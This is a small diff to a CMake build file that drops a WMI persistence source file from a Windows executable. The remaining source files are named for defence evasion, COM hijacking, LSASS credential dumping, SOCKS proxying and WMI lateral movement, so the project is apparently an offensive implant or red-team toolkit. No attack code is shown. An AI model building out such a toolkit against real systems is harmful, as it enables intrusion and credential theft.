@@ -78,7 +78,6 @@ add_executable(main WIN32
     src/evasion/Bloat.cpp
     src/execution/DotNetExecutor.cpp
     src/network/SocksProxy.cpp
-    src/persistence/WmiPersistence.cpp
     src/persistence/ComHijacker.cpp
     src/credential/LsassDumper.cpp
     src/lateral/WmiExec.cpp
